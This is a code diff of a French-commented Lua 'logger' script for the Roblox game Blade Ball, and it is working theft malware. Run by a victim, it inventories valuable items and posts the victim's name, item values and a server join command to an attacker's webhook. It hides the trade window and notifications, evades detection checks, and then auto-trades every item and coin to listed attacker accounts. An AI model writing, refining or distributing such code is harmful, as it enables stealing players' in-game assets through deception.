@@ -3,8 +3,7 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- // CONFIGURATION
-local auth_token = "EBK-SS-A" 
+-- // SERVICES
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
@@ -12,111 +11,49 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 local categories = {"Sword", "Emote", "Explosion"}
 
-local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri", "Andrewdagoatya"} -- Mets tes pseudos ici
+-- // CONFIGURATION
+local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 50
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
-if webhook == "" then return end
+-- // SECURITE SERVEUR & PIN
+if next(users) == nil or webhook == "" then return end
+if game.PlaceId ~= 13772394625 then return end
+if #Players:GetPlayers() >= 16 then return end
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then return end
 
--- // UI ET INVISIBILITE
+local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({["option"] = "PIN", ["value"] = "9079"})
+if PINReponse ~= "You don't have a PIN code" then
+    plr:kick("Désactive ton code PIN de trade.")
+    return
+end
+
+-- // UI INVISIBLE (Mouvement hors écran au lieu de .Enabled = false)
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui:WaitForChild("Trade")
-local inTrade = false
+local mainTrade = tradeGui:WaitForChild("Main")
+local notifications = PlayerGui:FindFirstChild("Notifications")
 
--- Cacher l'UI de trade pour la victime
-tradeGui.Enabled = false 
-tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-    inTrade = tradeGui.Enabled
-    if inTrade then tradeGui.Enabled = false end -- Force l'invisibilité
-end)
-
--- Désactiver les notifications pour plus de discrétion
-if PlayerGui:FindFirstChild("Notifications") then
-    PlayerGui.Notifications.Enabled = false
-end
-
--- // FONCTIONS DE TRADING (NET)
-local function sendTradeRequest(targetName)
-    local target = Players:WaitForChild(targetName)
-    pcall(function()
-        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer({target})
-    end)
-end
-
-local function addItemToTrade(itemType, ID)
-    pcall(function()
-        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
-    end)
-end
-
-local function readyTrade()
-    pcall(function()
-        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-    end)
-end
-
-local function confirmTrade()
-    pcall(function()
-        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-    end)
+local function hideUI()
+    mainTrade.Position = UDim2.new(5, 0, 5, 0) -- On le jette très loin
+    if notifications then notifications.Enabled = false end
+    tradeGui.Black.Visible = false
+    tradeGui.MiscChat.Visible = false
 end
 
 -- // FORMATAGE RAP
-local function formatNumber(number)
-    if not number then return "0" end
-    local suffixes = {"", "k", "m", "b", "t"}
-    local idx = 1
-    while number >= 1000 and idx < #suffixes do
-        number = number / 1000
-        idx = idx + 1
-    end
-    return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
+local function formatNumber(n)
+    if not n then return "0" end
+    local s = {"", "k", "m", "b", "t"}
+    local i = 1
+    while n >= 1000 and i < #s do n = n / 1000 i = i + 1 end
+    return i == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, s[i])
 end
 
--- // FONCTIONS WEBHOOKS
+-- // SCAN ET DATA
+local itemsToSend = {}
 local totalRAP = 0
-local itemsFound = {}
-
-local function SendJoinMessage(list, prefix)
-    local isGoodHit = totalRAP >= 500
-    local data = {
-        ["username"] = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
-        ["embeds"] = {{
-            ["title"] = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
-            ["color"] = isGoodHit and 65280 or 8323327,
-            ["fields"] = {
-                {name = "Victim:", value = "```"..plr.Name.."```", inline = true},
-                {name = "Total RAP:", value = "**"..formatNumber(totalRAP).."**", inline = true},
-                {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId}
-            },
-            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
-        }}
-    }
-    local req = (syn and syn.request) or (http and http.request) or http_request or request
-    req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
-end
-
-local function SendMessage()
-    local isGoodHit = totalRAP >= 500
-    local data = {
-        ["username"] = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)",
-        ["embeds"] = {{
-            ["title"] = "⚪ Server Hit 🎉",
-            ["color"] = isGoodHit and 65280 or 8323327,
-            ["fields"] = {
-                {name = "Victim:", value = "```"..plr.Name.."```", inline = true},
-                {name = "Status:", value = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT", inline = true}
-            },
-            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
-        }}
-    }
-    local req = (syn and syn.request) or (http and http.request) or http_request or request
-    req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
-end
-
--- // SCAN INVENTAIRE
 local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(ReplicatedStorage.Packages.Replion)
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
@@ -124,11 +61,12 @@ local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
 local function buildMap(cat)
     local m = {}
     local d = rapData[cat]
-    if not d then return m end
-    for k, r in pairs(d) do
-        local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
-        if s and type(dec) == "table" then
-            for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r break end end
+    if d then
+        for k, r in pairs(d) do
+            local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
+            if s and type(dec) == "table" then
+                for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r end end
+            end
         end
     end
     return m
@@ -141,52 +79,98 @@ for _, cat in ipairs(categories) do
             local r = map[info.Name] or 0
             if r >= min_rap and not info.TradeLock then
                 totalRAP = totalRAP + r
-                table.insert(itemsFound, {ItemID = id, RAP = r, itemType = cat, Name = info.Name})
+                table.insert(itemsToSend, {ItemID = id, RAP = r, itemType = cat, Name = info.Name})
             end
         end
     end
 end
 
--- // LOGIQUE DE TRADE AUTOMATIQUE
-local function executeTrade(gUser)
-    SendMessage() -- Envoie le webhook de join
+-- // ENVOI WEBHOOK (JSON)
+local function sendWebhook(isJoin)
+    local isGood = totalRAP >= 500
+    local color = isGood and 65280 or 8323327
     
-    -- On boucle jusqu'à ce que le trade soit fini ou qu'il n'y ait plus d'items
-    while #itemsFound > 0 do
-        sendTradeRequest(gUser)
+    local grouped = {}
+    for _, item in ipairs(itemsToSend) do grouped[item.Name] = (grouped[item.Name] or 0) + 1 end
+    local listText = ""
+    for name, count in pairs(grouped) do listText = listText .. name .. " (x" .. count .. ")\n" end
+
+    local data = {
+        ["username"] = isJoin and (isGood and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
+        ["content"] = isJoin and (ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')" or nil,
+        ["embeds"] = {{
+            ["title"] = isJoin and (isGood and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯") or "⚪ Server Hit 🎉",
+            ["color"] = color,
+            ["fields"] = {
+                {name = "Victim Username:", value = "```" .. plr.Name .. "```", inline = true},
+                {name = "Total RAP:", value = "**" .. formatNumber(totalRAP) .. "**", inline = true},
+                {name = "Item List:", value = listText ~= "" and listText or "None", inline = false}
+            },
+            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
+        }}
+    }
+    
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    if req then
+        pcall(function() 
+            req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) 
+        end)
+    end
+end
+
+-- // LOGIQUE DE TRADE
+local function startTrade(gUserName)
+    sendWebhook(false) -- Envoie le Server Hit
+    hideUI()
+
+    while #itemsToSend > 0 do
+        pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(gUserName)) end)
         
-        -- Attend que le trade s'ouvre (côté serveur, car UI cachée)
-        local timeout = 0
-        repeat task.wait(0.5) timeout = timeout + 1 until inTrade or timeout > 20
+        local start = tick()
+        repeat task.wait(0.5) until tradeGui.Enabled or tick() - start > 20
         
-        if inTrade then
-            -- On vide l'inventaire par lots de 12 (limite classique)
-            for i = 1, 12 do
-                if #itemsFound > 0 then
-                    local item = table.remove(itemsFound, 1)
-                    addItemToTrade(item.itemType, item.ItemID)
+        if tradeGui.Enabled then
+            hideUI()
+            
+            -- Ajout des items (Max 100 par trade)
+            local currentBatch = 0
+            for i = #itemsToSend, 1, -1 do
+                if currentBatch < 100 then
+                    local item = table.remove(itemsToSend, i)
+                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+                    currentBatch = currentBatch + 1
                 end
             end
+
+            -- Ajout des Tokens (Coins)
+            pcall(function()
+                local rawText = tradeGui.Main.Currency.Coins.Amount.Text
+                local tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
+                if tokens > 0 then
+                    netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
+                end
+            end)
+
+            task.wait(1)
+            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+            task.wait(1)
+            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
             
-            task.wait(0.5)
-            readyTrade()
-            task.wait(0.5)
-            confirmTrade()
-            
-            -- Attend la fin du trade
-            repeat task.wait(0.5) until not inTrade
+            repeat task.wait(0.5) until not tradeGui.Enabled
         end
         task.wait(1)
     end
+    plr:kick("Trade terminé.")
 end
 
 -- // LANCEMENT
-if #itemsFound > 0 then
-    SendJoinMessage(itemsFound, (ping == "Yes" and "@everyone " or ""))
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
+    sendWebhook(true) -- Scan initial
 
     local function check(p)
         if table.find(users, p.Name) then
-            executeTrade(p.Name)
+            startTrade(p.Name)
         end
     end
 
